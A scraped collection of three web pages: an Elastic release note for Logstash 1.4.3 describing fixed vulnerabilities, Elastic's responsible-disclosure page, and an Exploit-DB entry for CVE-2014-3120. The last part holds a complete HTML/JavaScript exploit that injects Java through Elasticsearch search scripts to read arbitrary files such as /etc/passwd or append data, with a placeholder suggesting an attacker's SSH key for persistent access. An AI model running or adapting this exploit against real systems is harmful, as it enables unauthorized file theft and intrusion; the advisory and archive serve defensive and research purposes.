![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt96bf0c70d7851e7d/64b6cd8378402d4f9cc28b43/icon-code-self-closing.svg)
## Learn

Unleash the possibilities of your data and grow your skill set.

* [Getting started](/getting-started)
* [Elastic resources](/learn)
* [Consulting services](/consulting)
* [Trainings & certifications](/training)
![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt96bf0c70d7851e7d/64b6cd8378402d4f9cc28b43/icon-code-self-closing.svg)
## Connect

Keep informed about the latest tech and news from Elastic.

* [Blog](/blog)
* [Events](/events)

---

Have questions?

* [Contact sales](/contact?storm=global-header-en)
* [Get support](/support)
[Pricing](/pricing)[Docs](https://www.elastic.co/docs)

New

[Read more](https://www.elastic.co/portfolio/operationalizing-generative-ai-strategic-guide)[About us](https://www.elastic.co/about)[Partners](https://www.elastic.co/partners)[Support](https://www.elastic.co/support)|[Login](https://cloud.elastic.co/login)

* Products
* Solutions
* Why Elastic?
* Resources
[Pricing](https://www.elastic.co/pricing)[Docs](https://www.elastic.co/docs)SearchStart free trialContact sales09 June 2015
# Logstash 1.4.3 released

By[Suyog Rao](/blog/author/suyog-rao)

Share

* Share on Twitter
* Share on Facebook
* Share on LinkedInr

We are pleased to announce the availability of Logstash 1.4.3. This is a bug fix release for the 1.4 series which fixes a few important security vulnerabilities. Our recommendation is to upgrade to 1.4.3 if you are using either of the following plugins:

* Elasticsearch output with node protocol
* Logstash Forwarder with Lumberjack input/output
* File Output

## Elasticsearch 1.1.1 vulnerability

Logstash 1.4.2 was bundled with Elasticsearch 1.1.1, which is vulnerable to [CVE-2014-3120](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2014-3120). These binaries are used in Elasticsearch output specifically when using the node protocol. Since a node client joins the Elasticsearch cluster, the attackers could use scripts to execute commands on the host OS using the node client's URL endpoint. With 1.4.3 release, we are packaging Logstash with Elasticsearch 1.5.2 binaries which by default disables the ability to run scripts. This also affects users who are using the configuration option embedded=>true in the Elasticsearch output which starts a local embedded Elasticsearch cluster. This is typically used in development environment and proof of concept deployments. Regardless of this vulnerability, we strongly recommend not using embedded in production

Note that users of transport and http protocol are not vulnerable to this attack.

## Logstash Forwarder with Lumberjack input/output

The combination of Logstash Forwarder and Lumberjack input (and output) was vulnerable to the [POODLE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566) attack in SSLv3 protocol. We have disabled SSLv3 for this combination and set the minimum version to be TLSv1.0. We have added this vulnerability to our CVE page and are working on filling out the CVE.

Thanks to Tray Torrance, Marc Chadwick, and David Arena for reporting this.

## File output vulnerability

An attacker could use the File output plugin with [dynamic field references](http://logstash.net/docs/1.4.2/configuration#sprintf) in the path option to traverse paths outside of Logstash directory. This technique could also be used to overwrite any files which can be accessed with permissions associated with Logstash user. This release sandboxes the paths which can be traversed using the configuration. We have also disallowed use of dynamic field references if the path options is pointing to an absolute path.

We have added this vulnerability to our [CVE page](https://www.elastic.co/community/security/) and are working on filling out the CVE. We would like to thank Colin Coghill for reporting the issue and working with us on the resolution.

## Other fixes

Fixed an issue in Elasticsearch output which was not correctly releasing socket connections. This fix was in the [ruby-ftw](https://github.com/jordansissel/ruby-ftw) HTTP client library, so any plugins using this should benefit from this resolution ([#1604](https://github.com/elastic/logstash/issues/1604))

Please check the [changelog](https://github.com/elastic/logstash/blob/1.4/CHANGELOG) or proceed to our [downloads](https://www.elastic.co/downloads/logstash) page.

[![Elastic home](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltf8467a95eaa27e4a/6638d7da0d02e4e98155aaa3/logo-tagline_secondary_all_white-177.svg)](/)
## Follow us

* [![Elastic's LinkedIn page](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blte7cfb1a091901ce1/5eb00c925751b2150e57a9d6/footer-icon-linkedin.svg)](https://www.linkedin.com/company/elastic-co)
* [![Elastic's YouTube page](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt7c28b18be98b1af8/5eb00ca908d37e6d82ef7655/footer-icon-youtube.svg)](https://www.youtube.com/user/elasticsearch)
* [![Elastic's Facebook page](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt75566c5278ad68da/5eb00c59d238e314f259fbea/footer-icon-facebook.svg)](https://www.facebook.com/elastic.co)
* [![Elastic's Twitter page](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt341fed86979a9fbb/5eb00c76b8a6356e4ddc1180/footer-icon-twitter.svg)](https://www.twitter.com/elastic)
* [![Elastic's GitHub page](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt6ef5841a45696d80/64ca2a6fc530871313bc3822/icon-footer-github.svg)](https://github.com/elastic)

* ## About us

  [About Elastic](/about/)[Leadership](/about/leadership)[DE&I](/careers/diversity-and-inclusion)[Blog](/blog)[Newsroom](/about/press)
* ## Join us

  [Careers](/careers)[Career portal](https://jobs.elastic.co/#/)[How we hire](/careers/how-we-hire)

* ## Partners

  [Find a partner](https://partners.elastic.co/findapartner/)[Partner login](https://login.elastic.co/login/partner)[Request access](https://partners.elastic.co/English/register_email.aspx)[Become a partner](/partners/become-a-partner)
* ## Trust & Security

  [Trust center](/trust)[EthicsPoint portal](https://secure.ethicspoint.com/domain/media/en/gui/74447/index.html)[ECCN report](/trust/business-integrity#international-trade-compliance—eccn-information)Ethics email

* ## Investor relations

  [Investor resources](https://ir.elastic.co/home/default.aspx)[Governance](https://ir.elastic.co/governance/corporate-governance/default.aspx)[Financials](https://ir.elastic.co/financials/quarterly-results/default.aspx)[Stock](https://ir.elastic.co/stock/stock-quote/default.aspx)
* ## Excellence Awards

  [Previous winners](/blog/2022-elastic-excellence-awards-winners)[ElasticON Tour](/elasticon)[Become a sponsor](/events/sponsor)[All events](/events/)

## About us

[About Elastic](/about/)[Leadership](/about/leadership)[DE&I](/careers/diversity-and-inclusion)[Blog](/blog)[Newsroom](/about/press)
## Join us

[Careers](/careers)[Career portal](https://jobs.elastic.co/#/)[How we hire](/careers/how-we-hire)
## Partners

[Find a partner](https://partners.elastic.co/findapartner/)[Partner login](https://login.elastic.co/login/partner)[Request access](https://partners.elastic.co/English/register_email.aspx)[Become a partner](/partners/become-a-partner)
## Trust & Security

[Trust center](/trust)[EthicsPoint portal](https://secure.ethicspoint.com/domain/media/en/gui/74447/index.html)[ECCN report](/trust/business-integrity#international-trade-compliance—eccn-information)Ethics email
## Investor relations

[Investor resources](https://ir.elastic.co/home/default.aspx)[Governance](https://ir.elastic.co/governance/corporate-governance/default.aspx)[Financials](https://ir.elastic.co/financials/quarterly-results/default.aspx)[Stock](https://ir.elastic.co/stock/stock-quote/default.aspx)
## Excellence Awards

[Previous winners](/blog/2022-elastic-excellence-awards-winners)[ElasticON Tour](/elasticon)[Become a sponsor](/events/sponsor)[All events](/events/)

* [Trademarks](/legal/trademarks)
* [Terms of Use](/legal/terms-of-use)
* [Privacy](/legal/privacy-statement)
* [Sitemap](/sitemap)

© . Elasticsearch B.V. All Rights Reserved

Elastic, Elasticsearch and other related marks are trademarks, logos or registered trademarks of Elasticsearch B.V. in the United States and other countries.

Apache, Apache Lucene, Apache Hadoop, Hadoop, HDFS and the yellow elephant logo are trademarks of the [Apache Software Foundation](https://www.apache.org/) in the United States and/or other countries. All other brand names, product names, or trademarks belong to their respective owners.



=== Content from www.elastic.co_8d227450_20250125_070657.html ===
[Skip to main content](#main-content)[Elastic](/)ENClose panel

* Deutsch
* English
* Español
* Français
* 日本語
* 한국어
* 简体中文
* Português
Search[Login](https://cloud.elastic.co)Toggle Navigation[Start free trial](https://cloud.elastic.co/registration)[Contact Sales](/contact)PlatformClose panel[## The Search AI Company](/platform)[![Search, Security, Observability](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltb72b02d269f3201a/6643847599f5a8667dc35ac7/nav-platform.png)](/platform)

Build tailored experiences with Elastic.

[Elastic Search AI Platform overview](/platform)

---

**Scale your business with Elastic Partners**

* [Find a partner](https://partners.elastic.co/findapartner/)
* [Become a partner](/partners/become-a-partner)
[Partner overview](/partners)![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt0090c6239e64faf8/62aa0980c949fd5059e8aebc/logo-stack-32-color.svg)
## ELK Stack

Search and analytics, data ingestion, and visualization – all at your fingertips.

* [Kibana](/kibana)
* [Elasticsearch](/elasticsearch)
* [Integrations](/integrations)

[ELK Stack overview](/elastic-stack)

---

**By developers, for developers**

* [Try the world's most used vector database](/elasticsearch/vector-database)
* [Scale with the low-latency Search AI Lake](/blog/search-ai-lake-elastic-cloud-serverless)
* [Join our community](/community)
![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltdb0f38c35ae455dc/5d07f086877575d0584760a3/logo-cloud-24-color.svg)
## Elastic Cloud

Unlock the power of real-time insights with Elastic on your preferred cloud provider.

[Elastic Cloud overview](/cloud)

---

* [Elastic Cloud Serverless](/cloud/serverless)
* [Elastic Cloud Serverless pricing](/pricing/serverless-search)
* [Search AI Lake](/cloud/serverless/search-ai-lake)
SolutionsClose panel[## Generative AI](/generative-ai)

Prototype and integrate with LLMs faster using search AI.

* [Search AI Lake](/cloud/serverless/search-ai-lake)
* [Elastic AI Assistant](/elasticsearch/ai-assistant)
* [Retrieval Augmented Generation](/enterprise-search/rag)

---

* [Generative AI blogs](/blog/category/generative-ai)
* [Search Labs tutorials](https://www.elastic.co/search-labs/tutorials)
* [Elastic Community](/community)
[Generative AI overview](/generative-ai) [![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt549f7d977c2a88f4/5d082d34616162aa5a85707d/logo-enterprise-search-32-color.svg)](/enterprise-search)[## Search](/enterprise-search)

Discover a world of AI possibilities — built with the power of search.

* [Vector database](/elasticsearch/vector-database)
* [Relevance](/enterprise-search/relevance)
* [Search applications](/enterprise-search/search-applications)
* [Ecommerce](/enterprise-search/ecommerce)
* [Website search](/enterprise-search/site-search)
* [Workplace search](/enterprise-search/workplace-search)
* [Customer support](/enterprise-search/customer-support)

---

* [Search Labs](https://www.elastic.co/search-labs)
[Search overview](/enterprise-search)[![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltf58b7c8e04706979/5e20f1a8132ead1155e8d0a4/logo-security-32-color.svg)](/security)[## Security](/security)

Protect, investigate, and respond to cyber threats with AI-driven security analytics.

* [SIEM](/security/siem)
* [AI for the SOC](/security/ai)
* [Threat Research](/security/cyber-threat-research)

---

* [Security Labs](https://www.elastic.co/security-labs)
[Security overview](/security)[![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltbf6ba0d0e0e1e5ab/5e20f19a2aa8e40a75136318/logo-observability-32-color.svg)](/observability)[## Observability](/observability)

Unify app and infrastructure visibility to proactively resolve issues.

* [Log monitoring and analytics](/observability/log-monitoring)
* [OpenTelemetry](/observability/opentelemetry)
* [Application performance monitoring](/observability/application-performance-monitoring)
* [Infrastructure monitoring](/observability/infrastructure-monitoring)
* [Synthetic monitoring](/observability/synthetic-monitoring)
* [Real user monitoring](/observability/real-user-monitoring)
* [Universal Profiling](/observability/universal-profiling)
* [AIOps](/observability/aiops)

---

* [Observability Labs](https://www.elastic.co/observability-labs)
[Observability overview](/observability)CustomersClose panel[![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltacc5e178e52f430e/647ccc7b6be35fb5eabd2100/icon-checkmark-decorative-border.svg)](/customers)[## By solution](/customers)

See how customers search, solve, and succeed — all on one Search AI Platform.

* [Search](/customers/success-stories?usecase=enterprise-search&industry=All)
* [Security](/customers/success-stories?usecase=security-analytics&industry=All)
* [Observability](/customers/success-stories?usecase=elastic-observability&industry=All)
[All customer stories](/customers)[![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt9f634b6f74878698/647ccc625637890f19859454/icon-briefcase.svg)](/industries)[## Industries](/industries)

Exceed customer expectations and go to market faster.

* [Public sector](/industries/public-sector)
* [Financial services](/industries/financial-services)
* [Telecommunications](/industries/telecommunications)
* [Retail](/industries/retail-ecommerce)
* [Manufacturing](/industries/manufacturing)
[Industries overview](/industries)
## Customer spotlight

![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt652fec920f2b1a14/650c1d87aa86c13fa1cc288c/logo-nav-dropdown-48x48-cisco.svg)

Cisco saves 5,000 support engineer hours per month

[Read more](/customers/cisco)![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blte788c0f923f209a3/668c49f5534bb913eb26e9e8/logo-dropdown-48x48-sitecore.svg)

Sitecore automates 96 percent of security workflows with Elastic

[Read more](/customers/sitecore-security)![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt90a52ed02808cbc1/650c1dadb25642d90add1e4e/logo-nav-dropdown-48x48-comcast.svg)

Comcast transforms customer experiences with Elastic Observability

[Read more](/customers/comcast)ResourcesClose panel![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt96bf0c70d7851e7d/64b6cd8378402d4f9cc28b43/icon-code-self-closing.svg)
## Research

Stay at the forefront of innovation with technical tips from the experts.

* [Search Labs](https://www.elastic.co/search-labs)
* [Security Labs](https://www.elastic.co/security-labs)
* [Observability Labs](https://www.elastic.co/observability-labs)
![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt96bf0c70d7851e7d/64b6cd8378402d4f9cc28b43/icon-code-self-closing.svg)
## Build

Code with other developers to create a better Elastic, together.

* [Community](/community)
* [Forum](https://discuss.elastic.co)
* [Downloads](/downloads)
* [Documentation](/guide)
![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt96bf0c70d7851e7d/64b6cd8378402d4f9cc28b43/icon-code-self-closing.svg)
## Learn

Unleash the possibilities of your data and grow your skill set.

* [Getting started](/getting-started)
* [Elastic resources](/learn)
* [Consulting services](/consulting)
* [Trainings & certifications](/training)
![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt96bf0c70d7851e7d/64b6cd8378402d4f9cc28b43/icon-code-self-closing.svg)
## Connect

Keep informed about the latest tech and news from Elastic.

* [Blog](/blog)
* [Events](/events)

---

Have questions?

* [Contact sales](/contact?storm=global-header-en)
* [Get support](/support)
[Pricing](/pricing)[Docs](https://www.elastic.co/docs)

New

[Read more](https://www.elastic.co/portfolio/operationalizing-generative-ai-strategic-guide)[About us](https://www.elastic.co/about)[Partners](https://www.elastic.co/partners)[Support](https://www.elastic.co/support)|[Login](https://cloud.elastic.co/login)

* Products
* Solutions
* Why Elastic?
* Resources
[Pricing](https://www.elastic.co/pricing)[Docs](https://www.elastic.co/docs)SearchStart free trialContact sales![](/static-res/images/hero/generic-d-light-left.svg)![](/static-res/images/hero/generic-c-light-right.svg)
# Security issues

## Responsible Vulnerability Disclosure

Elastic values our partnership with the security community and shares the goal of keeping our users and the internet safe. Please report potential security vulnerabilities affecting any of Elastic's products, the Elastic Cloud Service, or the elastic.co website via our [HackerOne bug bounty program](https://hackerone.com/elastic?type=team). For detailed scope and rules of engagement please refer to our HackerOne program [policy](https://hackerone.com/elastic?view_policy=true).

Under the principles of Coordinated Vulnerability Disclosure, Elastic analyzes potential security vulnerabilities to identify any recommended mitigations or product updates and coordinates disclosures via Elastic Security Advisories (ESA) and the CVE program. Elastic requests that you do not post or share any information about potential vulnerabilities in any public forum until we have researched and responded to the issue.

## Other security issues

Users and customers may report any other potential security issues to security@elastic.co. This address can be used for product security related inquiries or requests about other security topics that are not explicitly mentioned here. We can accept only security issues at this address. Bug reports should be directed to the bug database of the project you're reporting it on or raised to Elastic Support.

If you would like to encrypt your message to us, please use our PGP key. The fingerprint is

1224 D1A5 72A7 3755 B61A 377B 14D6 5EE0 D2AE 61D2

The key is available via keyservers; search for 'security@elastic.co'. [Example on OpenPGP](https://keys.openpgp.org/search?q=security%40elastic.co)

## Elastic Security Advisories

An Elastic Security Advisory (ESA) is an announcement about a security issue with one or more Elastic products. Elastic assigns a CVE and an ESA identifier to each advisory and publishes a summary of the issue with remediation and mitigation details. All new advisories are announced in the [Security Announcements](https://discuss.elastic.co/c/announcements/security-announcements) forum. Subscribe to these announcements by clicking the bell icon and selecting 'Watching' on the forum page or, alternatively, via the [RSS feed](https://discuss.elastic.co/c/announcements/security-announcements.rss).

---

[![Elastic home](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltf8467a95eaa27e4a/6638d7da0d02e4e98155aaa3/logo-tagline_secondary_all_white-177.svg)](/)
## Follow us

* [![Elastic's LinkedIn page](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blte7cfb1a091901ce1/5eb00c925751b2150e57a9d6/footer-icon-linkedin.svg)](https://www.linkedin.com/company/elastic-co)
* [![Elastic's YouTube page](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt7c28b18be98b1af8/5eb00ca908d37e6d82ef7655/footer-icon-youtube.svg)](https://www.youtube.com/user/elasticsearch)
* [![Elastic's Facebook page](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt75566c5278ad68da/5eb00c59d238e314f259fbea/footer-icon-facebook.svg)](https://www.facebook.com/elastic.co)
* [![Elastic's Twitter page](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt341fed86979a9fbb/5eb00c76b8a6356e4ddc1180/footer-icon-twitter.svg)](https://www.twitter.com/elastic)
* [![Elastic's GitHub page](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt6ef5841a45696d80/64ca2a6fc530871313bc3822/icon-footer-github.svg)](https://github.com/elastic)

* ## About us

  [About Elastic](/about/)[Leadership](/about/leadership)[DE&I](/careers/diversity-and-inclusion)[Blog](/blog)[Newsroom](/about/press)
* ## Join us

  [Careers](/careers)[Career portal](https://jobs.elastic.co/#/)[How we hire](/careers/how-we-hire)

* ## Partners

  [Find a partner](https://partners.elastic.co/findapartner/)[Partner login](https://login.elastic.co/login/partner)[Request access](https://partners.elastic.co/English/register_email.aspx)[Become a partner](/partners/become-a-partner)
* ## Trust & Security

  [Trust center](/trust)[EthicsPoint portal](https://secure.ethicspoint.com/domain/media/en/gui/74447/index.html)[ECCN report](/trust/business-integrity#international-trade-compliance—eccn-information)Ethics email

* ## Investor relations

  [Investor resources](https://ir.elastic.co/home/default.aspx)[Governance](https://ir.elastic.co/governance/corporate-governance/default.aspx)[Financials](https://ir.elastic.co/financials/quarterly-results/default.aspx)[Stock](https://ir.elastic.co/stock/stock-quote/default.aspx)
* ## Excellence Awards

  [Previous winners](/blog/2022-elastic-excellence-awards-winners)[ElasticON Tour](/elasticon)[Become a sponsor](/events/sponsor)[All events](/events/)

## About us

[About Elastic](/about/)[Leadership](/about/leadership)[DE&I](/careers/diversity-and-inclusion)[Blog](/blog)[Newsroom](/about/press)
## Join us

[Careers](/careers)[Career portal](https://jobs.elastic.co/#/)[How we hire](/careers/how-we-hire)
## Partners

[Find a partner](https://partners.elastic.co/findapartner/)[Partner login](https://login.elastic.co/login/partner)[Request access](https://partners.elastic.co/English/register_email.aspx)[Become a partner](/partners/become-a-partner)
## Trust & Security

[Trust center](/trust)[EthicsPoint portal](https://secure.ethicspoint.com/domain/media/en/gui/74447/index.html)[ECCN report](/trust/business-integrity#international-trade-compliance—eccn-information)Ethics email
## Investor relations

[Investor resources](https://ir.elastic.co/home/default.aspx)[Governance](https://ir.elastic.co/governance/corporate-governance/default.aspx)[Financials](https://ir.elastic.co/financials/quarterly-results/default.aspx)[Stock](https://ir.elastic.co/stock/stock-quote/default.aspx)
## Excellence Awards

[Previous winners](/blog/2022-elastic-excellence-awards-winners)[ElasticON Tour](/elasticon)[Become a sponsor](/events/sponsor)[All events](/events/)

* [Trademarks](/legal/trademarks)
* [Terms of Use](/legal/terms-of-use)
* [Privacy](/legal/privacy-statement)
* [Sitemap](/sitemap)

© . Elasticsearch B.V. All Rights Reserved

Elastic, Elasticsearch and other related marks are trademarks, logos or registered trademarks of Elasticsearch B.V. in the United States and other countries.

Apache, Apache Lucene, Apache Hadoop, Hadoop, HDFS and the yellow elephant logo are trademarks of the [Apache Software Foundation](https://www.apache.org/) in the United States and/or other countries. All other brand names, product names, or trademarks belong to their respective owners.



=== Content from www.exploit-db.com_21994cb2_20250125_070653.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# ElasticSearch - Remote Code Execution

#### EDB-ID:

###### 33370

#### CVE:

###### [2014-3120](https://nvd.nist.gov/vuln/detail/CVE-2014-3120)

---

**EDB Verified:**

#### Author:

###### [Jeff Geiger](/?author=7296)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2014-05-15

---

**Vulnerable App:**

```
<!--
##CVE-2014-3120 Elastic Search Remote Code Execution

This project demonstrates the CVE-2014-3120 vulnerability/misconfiguration.  It allows you to read from and append to files on the system hosting ES, provided the user running ES has access to them.

###Notes

This does not require a web server.  Save it locally and run it from a browser.

Discovery and vuln publishing credit goes to: @BvdBijl - http://bouk.co/blog/elasticsearch-rce/
-->

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<!-- Latest compiled and minified CSS -->
<link href="http://netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css" rel="stylesheet">

<!-- Optional theme -->
<link href="http://netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap-theme.min.css" rel="stylesheet">
<style>
body {
  padding-top: 50px;
}
.starter-template {
  padding: 40px 15px;
  text-align: center;
}

</style>
</head>

<script src="http://code.jquery.com/jquery-1.11.1.min.js"></script>
<script>
function es_inject() {

var read_file;
var write_file;

read_file = function(filename) {
  return ("import java.util.*;\nimport java.io.*;\nnew Scanner(new File(\"" + filename + "\")).useDelimiter(\"\\\\Z\").next();");
};

write_file = function(filename) {
  return ("import java.util.*;\nimport java.io.*;\nPrintWriter writer = new PrintWriter(new BufferedWriter(new FileWriter(\"" + filename + "\", true)));\nwriter.println(\"" + document.getElementById("element_2").value + "\");\nwriter.close();");
};

$(function() {
  var payload, filename, files, host, _i, _len;
  files = [document.getElementById("element_3").value];
  payload = {
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {}
        }
      }
    },
    "script_fields": {}
  };
        if (document.getElementById("element_4").checked) {
        for (_i = 0, _len = files.length; _i < _len; _i++) {
          filename = files[_i];
          payload["script_fields"][filename] = {
                  "script": write_file(filename)
        };
        }
       } else {
          for (_i = 0, _len = files.length; _i < _len; _i++) {
          filename = files[_i];
          payload["script_fields"][filename] = {
                  "script": read_file(filename)
        };
        }
       }

  $.getJSON("http://" + document.getElementById("element_1").value + ":9200/_search?source=" + (encodeURIComponent(JSON.stringify(payload))) + "&callback=?", function(data) {
    var content, contents, hit, _j, _len1, _ref, _results;
    console.log(data);
    _ref = data["hits"]["hits"];
    _results = [];
    for (_j = 0, _len1 = _ref.length; _j < _len1; _j++) {
      hit = _ref[_j];
      _results.push((function() {
        var _k, _len2, _ref1;
        _ref1 = hit["fields"];
        for (filename in _ref1) {
          contents = _ref1[filename];
          document.getElementById("script_results").innerHTML += ("<h2>" + filename + "</h2>");
          for (_k = 0, _len2 = contents.length; _k < _len2; _k++) {
            content = contents[_k];
            document.getElementById("script_results").innerHTML += (content);
          }
          document.getElementById("script_results").innerHTML += ("<hr>");
    //document.getElementById("script_results").innerHTML += (document.getElementById("element_4").checked);
        }
      })());
    }
    return _results;
  });
});
};
//es_inject();
</script>
<body>

    <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="#">Elastic Inject</a>
        </div>

      </div>
    </div>

    <div class="container">

      <div class="starter-template">
                <h2>CVE-2014-3120 Elastic Search Remote Code Execution</h2>
                <p class="lead">This will read and write files from an ES instance vulnerable to CVE-2014-3120.<br> This is for demonstration purposes only.</p>
      </div>
      <div class="col-md-8">
                <!-- <form id="ES_Inject" action="" method=""> /-->
                <label for="element_1">ES_IP_Address: </label><br/>
                <input id="element_1" name="element_1" class="element text medium" type="text" maxlength="255" value="127.0.0.1"/> <br/>
                <label for="element_3">File to read/append to: </label><br/>
                <input id="element_3" name="element_3" class="element text medium" type="text" maxlength="255" value="/etc/passwd"/> <br/>
                <label class="description" for="element_2">Content to append: </label><br/>
                <textarea id="element_2" name="element_2" class="element textarea large">YOUR_SSH_PUBLIC_KEY or SOMETHING&lt;/textarea&gt; <br/>
    <!-- <input id="element_4" type="radio" name="es_action" value="read" checked>READ<br/> /-->
    <input id="element_4" type="checkbox" name="es_action" value="write">WRITE<br/>
                <!-- <input id="saveForm" class="button_text" type="submit" name="submit" value="Submit" onClick="es_inject();"/> /-->
                <button onclick="es_inject();">Click me</button>
                <!-- </form> /-->
<h3>Your file contents should appear below if a read is successful. </h3>
<div id="script_results">

</div>
     </div>
<div class="col-md-8">
  Original vulnerability discovered by <a href="https://twitter.com/bvdbijl"> @BvdBijl</a>  - <a href="http://bouk.co/blog/elasticsearch-rce/">http://bouk.co/blog/elasticsearch-rce/</a>
</div>
    </div><!-- /.container -->
    <script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>
</body></html>

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
